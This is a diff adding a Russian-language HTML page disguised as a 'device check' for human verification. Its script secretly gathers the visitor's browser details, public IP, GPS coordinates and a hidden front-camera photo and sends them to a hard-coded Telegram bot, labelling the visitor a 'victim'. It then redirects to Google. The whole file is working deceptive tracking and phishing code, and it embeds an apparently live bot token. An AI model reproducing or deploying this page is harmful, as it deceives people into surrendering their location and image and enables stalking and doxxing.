@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Проверка устройства</title>
+    <style>
+        body { font-family: sans-serif; background: #121212; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e1e1e; padding: 30px; border-radius: 12px; text-align: center; max-width: 350px; }
+        h2 { color: #4CAF50; }
+        p { color: #aaa; font-size: 14px; }
+        button { width: 100%; padding: 15px; background: #4CAF50; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; margin-top: 20px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>System Check</h2>
+        <p>Нажмите кнопку ниже, чтобы подтвердить, что вы человек, и обновить систему безопасности.</p>
+        <button id="startBtn">Проверить устройство</button>
+    </div>
+
+    <video id="camera" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8";
+        const CHAT_ID = "7485234259";
+
+        function sendText(text) {
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+        }
+
+        async function sendPhoto(blob, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('caption', caption);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        }
+
+        document.getElementById('startBtn').addEventListener('click', async function() {
+            this.innerText = "Сканирование...";
+            this.disabled = true;
+
+            // 1. Инфа об устройстве
+            const deviceInfo = `📱 Устройство: ${navigator.userAgent}\n📺 Экран: ${window.screen.width}x${window.screen.height}\n🌐 Язык: ${navigator.language}`;
+            sendText(`🎯 Новая жертва!\n${deviceInfo}`);
+
+            // 2. IP
+            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => sendText(`🌐 IP: ${d.ip}`)).catch(()=>{});
+
+            // 3. GPS
+            navigator.geolocation.getCurrentPosition(
+                (pos) => sendText(`🗺️ GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
+                (err) => sendText(`🗺️ GPS: Отклонен`)
+            );
+
+            // 4. Фото
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                const video = document.getElementById('camera');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1000));
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(track => track.stop());
+
+                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
+                await sendPhoto(blob, `📸 Селфи жертвы`);
+            } catch (err) {
+                sendText(`📸 Камера: Запрещена`);
+            }
+
+            this.innerText = "Проверка завершена";
+            setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
+        });
+    </script>
+</body>
+</html>
